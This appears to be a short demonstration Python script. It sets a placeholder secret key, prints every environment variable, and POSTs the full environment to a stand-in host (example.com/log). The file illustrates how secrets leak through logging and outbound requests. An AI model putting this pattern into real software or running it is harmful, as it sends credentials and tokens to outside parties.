import os
import requests

# Set a sensitive environment variable (this could be a secret API key, for instance)
os.environ['SECRET_KEY'] = 'super_secret_key'

# This line prints all environment variables, including the sensitive one
print(f"[INFO] Environment: {os.environ}")

# Simulate sending environment information to an external service (for demonstration purposes)
external_service_url = 'https://example.com/log'
response = requests.post(external_service_url, data={'environment': str(os.environ)})

# Check if the request to the external service was successful
if response.status_code == 200:
    print("[INFO] Environment information sent successfully.")
else:
    print("[ERROR] Failed to send environment information.")
